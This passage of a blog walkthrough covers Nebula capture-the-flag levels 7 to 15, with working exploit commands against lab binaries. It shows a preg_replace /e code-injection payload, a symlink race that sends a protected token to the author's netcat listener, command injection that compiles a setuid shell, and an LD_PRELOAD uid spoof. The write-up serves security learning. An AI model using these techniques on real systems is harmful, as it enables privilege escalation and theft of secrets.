3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.011/0.018/0.023/0.007 ms
* Closing connection 0
&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally back on the NebulaVM after this curl from my host:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level07@nebula:/home/flag07$ /var/tmp/flag07
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level08&#34;&gt;level08&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level08/&#34;&gt;Level08&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Logging in as the user &lt;code&gt;level08&lt;/code&gt; reveals a pcap in the &lt;code&gt;flag08&lt;/code&gt; directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level08@nebula:~$ cd ~flag08
level08@nebula:/home/flag08$ ls
capture.pcap

level08@nebula:/home/flag08$ file capture.pcap
capture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_level8_pcap.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the &lt;code&gt;level8&lt;/code&gt; account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_level8_tcp_stream.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;code&gt;F7&lt;/code&gt; according to the ASCII table is a backspace. That makes this easy :) Considering we have the password &lt;code&gt;backdoor...00Rm8.ate&lt;/code&gt;, substituting the dot with backspaces we end up with &lt;code&gt;backd00Rmate&lt;/code&gt; as the password.&lt;/p&gt;

&lt;p&gt;So, to solve level08:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level08@nebula:/home/flag08$ su - flag08
Password:

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level09&#34;&gt;level09&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level09/&#34;&gt;Level09&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There’s a C setuid wrapper for some vulnerable PHP code…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the &lt;code&gt;flag09&lt;/code&gt; directory, we have the above PHP sample as well as a SUID binary.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:~$ cd ~flag09
level09@nebula:/home/flag09$ ls -lh
total 8.0K
-rwsr-x--- 1 flag09 level09 7.1K 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At first I managed to solve this one really fast. When &lt;code&gt;flag09&lt;/code&gt; is invoked with &lt;code&gt;-h&lt;/code&gt;, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:/home/flag09$ ./flag09 -a
Interactive shell

php &amp;gt; system(&amp;quot;id&amp;quot;);
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this I would have been able to prepare the small &lt;code&gt;flag09&lt;/code&gt; setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.&lt;/p&gt;

&lt;p&gt;The PHP code basically had 2 main functions. &lt;code&gt;markup()&lt;/code&gt; and &lt;code&gt;spam()&lt;/code&gt;. &lt;code&gt;markup()&lt;/code&gt; would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching &lt;code&gt;[email addr]&lt;/code&gt; where &lt;em&gt;addr&lt;/em&gt; will be the extracted part. It then as a callback executes &lt;code&gt;spam()&lt;/code&gt; which will convert &lt;code&gt;.&lt;/code&gt; to &lt;code&gt;dot&lt;/code&gt; and &lt;code&gt;@&lt;/code&gt; to &lt;code&gt;AT&lt;/code&gt;. I took a really long time researching the &lt;code&gt;preg_replace()&lt;/code&gt; functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when &lt;code&gt;preg_replace()&lt;/code&gt; is called with the &lt;code&gt;e&lt;/code&gt; modifier. &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;This&lt;/a&gt; blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs &lt;a href=&#34;http://php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;here&lt;/a&gt; helps develop a payload for exploitation. The PHP documentation has a sample of &lt;code&gt;&amp;lt;h1&amp;gt;{${eval($_GET[php_code])}}&amp;lt;/h1&amp;gt;&lt;/code&gt; which is what I used to finish the final payload for this level.&lt;/p&gt;

&lt;p&gt;Another thing to note about the PHP code is the &lt;code&gt;$use_me&lt;/code&gt; variable passed to the &lt;code&gt;markup()&lt;/code&gt; function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)&lt;/p&gt;

&lt;p&gt;So, to solve level09:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:/home/flag09$ echo -ne &amp;quot;[email {\${system(\$use_me)}}]&amp;quot; &amp;gt; /var/tmp/flag09.txt

level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt
[email {${system($use_me)}}]

level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt &amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&amp;quot;
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1

level09@nebula:/home/flag09$ /var/tmp/flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;intermission&#34;&gt;intermission&lt;/h3&gt;

&lt;p&gt;From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)&lt;/p&gt;

&lt;p&gt;I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
Lets get to them!&lt;/p&gt;

&lt;h2 id=&#34;level10&#34;&gt;level10&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level10/&#34;&gt;Level10&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
      printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }

#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(&amp;quot;wrote file!\n&amp;quot;);

  } else {
      printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with &lt;code&gt;nc -lk 18211&lt;/code&gt; and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the &lt;code&gt;flag10&lt;/code&gt; binary as I did not have read access to this.&lt;/p&gt;

&lt;p&gt;The problem with this program through is the fact that it checks if the file can be read using &lt;code&gt;access()&lt;/code&gt;, then only later opens it using &lt;code&gt;open()&lt;/code&gt;. Using this method it may be possible to change out the file before it hits the &lt;code&gt;open()&lt;/code&gt; method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called &lt;a href=&#34;http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use&#34;&gt;TOCTTOU&lt;/a&gt;. The Wikipedia article describes almost exactly the same scenario as we have here.&lt;/p&gt;

&lt;p&gt;My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the &lt;code&gt;flag10&lt;/code&gt; binary in its own loop as well.&lt;/p&gt;

&lt;p&gt;So, to solve level10:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:/home/flag10$ while true; do ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; done &amp;amp;
[1] 14219

# the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.

level10@nebula:/home/flag10$ while true; do ./flag10 /var/tmp/flag10-token 192.168.217.1; done
You don&#39;t have access to /var/tmp/flag10-token
You don&#39;t have access to /var/tmp/flag10-token
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On my netcat listener I now had:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » nc -lk 18211
.oO Oo.
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the token file read, we end the level:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:/home/flag10$ su - flag10
Password:
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level11&#34;&gt;level11&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level11/&#34;&gt;Level11&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv(&amp;quot;TEMP&amp;quot;);
  pid = getpid();

  asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid,
      &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10),
      &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
      &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;

  for(i = 0; i &amp;lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, &amp;quot;reading from stdin&amp;quot;);
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, &amp;quot;invalid header&amp;quot;);
  }

  length = atoi(line + strlen(CL));

  if(length &amp;lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, &amp;quot;fread length&amp;quot;);
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;amp;path);

      while(blue &amp;gt; 0) {
          printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf(&amp;quot;pink = %d\n&amp;quot;, pink);

          if(pink &amp;lt;= 0) {
              err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, &amp;quot;mmap&amp;quot;);
      }
      process(mem, length);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute &lt;code&gt;getflag&lt;/code&gt; so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(&lt;/p&gt;

&lt;h2 id=&#34;level12&#34;&gt;level12&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level12/&#34;&gt;Level12&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Lua program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;local socket = require(&amp;quot;socket&amp;quot;)
local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))

function hash(password)
  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
  data = prog:read(&amp;quot;*all&amp;quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&amp;quot;Password: &amp;quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
      local h = hash(line)

      if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
          client:send(&amp;quot;Better luck next time\n&amp;quot;);
      else
          client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
      end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level had another very obvious command injection vulnerability on the line where a &lt;code&gt;password&lt;/code&gt; variable is piped through &lt;code&gt;sha1sum&lt;/code&gt;. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a &lt;code&gt;;&lt;/code&gt; character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.&lt;/p&gt;

&lt;p&gt;So, to solve level12:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level12@nebula:~$ echo &amp;quot;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&amp;quot; | nc 127.0.0.1 50001
Password: Better luck next time

level12@nebula:~$ /var/tmp/flag12
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level13&#34;&gt;level13&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level13/&#34;&gt;Level13&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
      printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf(&amp;quot;your token is %s\n&amp;quot;, token);

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level had me researching for quite some time. I came to learn of ELF DSO&amp;rsquo;s and &lt;code&gt;LD_PRELOAD&lt;/code&gt;. Basically, it is possible to have the dynamic linker preload shared libraries from the &lt;code&gt;LD_PRELOAD&lt;/code&gt; environment variable that may allow for some functions to be modified. &lt;a href=&#34;https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/&#34;&gt;This&lt;/a&gt; article contained most of the magic that was needed to get this level done.&lt;/p&gt;

&lt;p&gt;I decided to &amp;lsquo;override&amp;rsquo; the &lt;code&gt;getuid()&lt;/code&gt; function so that it would return the value of the &lt;code&gt;FAKEUID&lt;/code&gt; constant in the program, instead of the value the real &lt;code&gt;getuid()&lt;/code&gt; would have returned. For that to happen, I looked up the arguments for &lt;code&gt;getuid()&lt;/code&gt; from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous &lt;code&gt;-shared -fPIC&lt;/code&gt; arguments for position independent code and exported the &lt;code&gt;LD_PRELOAD&lt;/code&gt; variable prior to running the binary.&lt;/p&gt;

&lt;p&gt;One important thing to note here is that this &amp;lsquo;hack&amp;rsquo; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the &lt;code&gt;LD_PRELOAD&lt;/code&gt; environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override &lt;code&gt;getuid()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So, to solve level13:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level13@nebula:/var/tmp$ cp ~flag13/flag13 .

level13@nebula:/var/tmp$ cat fake_getuid.c
#include&amp;lt;unistd.h&amp;gt;

uid_t getuid(void) {
    return 1000;
}

level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o

level13@nebula:/var/tmp$ LD_PRELOAD=/var/tmp/fake_getuid.o ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58

level13@nebula:/var/tmp$ su - flag13
Password:
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level14&#34;&gt;level14&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level14/&#34;&gt;Level14&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Logged in as user &lt;code&gt;level14&lt;/code&gt;, we see 2 files in the &lt;code&gt;flag14&lt;/code&gt; directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:~$ cd ~flag14
level14@nebula:/home/flag14$ ls -lh
total 8.0K
-rwsr-x--- 1 flag14  level14 7.2K 2011-12-05 18:59 flag14
-rw------- 1 level14 level14   37 2011-12-05 18:59 token

level14@nebula:/home/flag14$ cat token
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;token&lt;/code&gt; obviously being the target to decrypt. Running &lt;code&gt;flag14&lt;/code&gt; tells us that it is expecting a &lt;code&gt;-e&lt;/code&gt; flag to encrypt. So, I tested the encryption to see how it behaves:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ ./flag14 -e
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What immediately jumped out at me was the A&amp;rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# exploit-exercises level14 cryptor

string = &#39;AABBCCDDEEFFGG&#39;
key = 0
result = &#39;&#39;

print &#39;String: {s}\nStrlen: {l}\t&#39;.format(s = string, l = len(string))

for char in string:
    print &#39;Key: {key}\t Char: {char}\t Ord: {ord}\t Res: {res}&#39;.format(
        key = key, char = char, ord = ord(char), res = chr(ord(char) + key)
    )
    result += chr(ord(char) + key)
    key += 1

print &#39;\nResult: {res}&#39;.format(res = result)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this meant that the output would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ # python crypt.py
String: AABBCCDDEEFFGG
Strlen: 14
Key: 0   Char: A     Ord: 65     Res: A
Key: 1   Char: A     Ord: 65     Res: B
Key: 2   Char: B     Ord: 66     Res: D
Key: 3   Char: B     Ord: 66     Res: E
Key: 4   Char: C     Ord: 67     Res: G
Key: 5   Char: C     Ord: 67     Res: H
Key: 6   Char: D     Ord: 68     Res: J
Key: 7   Char: D     Ord: 68     Res: K
Key: 8   Char: E     Ord: 69     Res: M
Key: 9   Char: E     Ord: 69     Res: N
Key: 10  Char: F     Ord: 70     Res: P
Key: 11  Char: F     Ord: 70     Res: Q
Key: 12  Char: G     Ord: 71     Res: S
Key: 13  Char: G     Ord: 71     Res: T

Result: ABDEGHJKMNPQST
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The same string was checked using the &lt;code&gt;flag14&lt;/code&gt; cryptor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ ./flag14 -e
AABBCCDDEEFFGG
ABDEGHJKMNPQST
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the &lt;code&gt;token&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ # python decrypt.py
String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
Strlen: 36  Key start = 0
Key: 0   Char: 8     Ord: 56     Res: 8
Key: 1   Char: 5     Ord: 53     Res: 4
Key: 2   Char: 7     Ord: 55     Res: 5
Key: 3   Char: :     Ord: 58     Res: 7
Key: 4   Char: g     Ord: 103    Res: c
Key: 5   Char: 6     Ord: 54     Res: 1
Key: 6   Char: 7     Ord: 55     Res: 1
Key: 7   Char: ?     Ord: 63     Res: 8
Key: 8   Char: 5     Ord: 53     Res: -
Key: 9   Char: A     Ord: 65     Res: 8
Key: 10  Char: B     Ord: 66     Res: 8
Key: 11  Char: B     Ord: 66     Res: 7
Key: 12  Char: o     Ord: 111    Res: c
Key: 13  Char: :     Ord: 58     Res: -
Key: 14  Char: B     Ord: 66     Res: 4
Key: 15  Char: t     Ord: 116    Res: e
Key: 16  Char: D     Ord: 68     Res: 4
Key: 17  Char: A     Ord: 65     Res: 0
Key: 18  Char: ?     Ord: 63     Res: -
Key: 19  Char: t     Ord: 116    Res: a
Key: 20  Char: I     Ord: 73     Res: 5
Key: 21  Char: v     Ord: 118    Res: a
Key: 22  Char: L     Ord: 76     Res: 6
Key: 23  Char: D     Ord: 68     Res: -
Key: 24  Char: K     Ord: 75     Res: 3
Key: 25  Char: L     Ord: 76     Res: 3
Key: 26  Char: {     Ord: 123    Res: a
Key: 27  Char: M     Ord: 77     Res: 2
Key: 28  Char: Q     Ord: 81     Res: 5
Key: 29  Char: P     Ord: 80     Res: 3
Key: 30  Char: S     Ord: 83     Res: 5
Key: 31  Char: R     Ord: 82     Res: 3
Key: 32  Char: Q     Ord: 81     Res: 1
Key: 33  Char: W     Ord: 87     Res: 6
Key: 34  Char: W     Ord: 87     Res: 5
Key: 35  Char: .     Ord: 46     Res:


Result: 8457c118-887c-4e40-a5a6-33a25353165
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, to solve level14:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ su - flag14
Password:
flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level15&#34;&gt;level15&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level15/&#34;&gt;Level15&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)&lt;/p&gt;
&lt;/blockquote&gt;

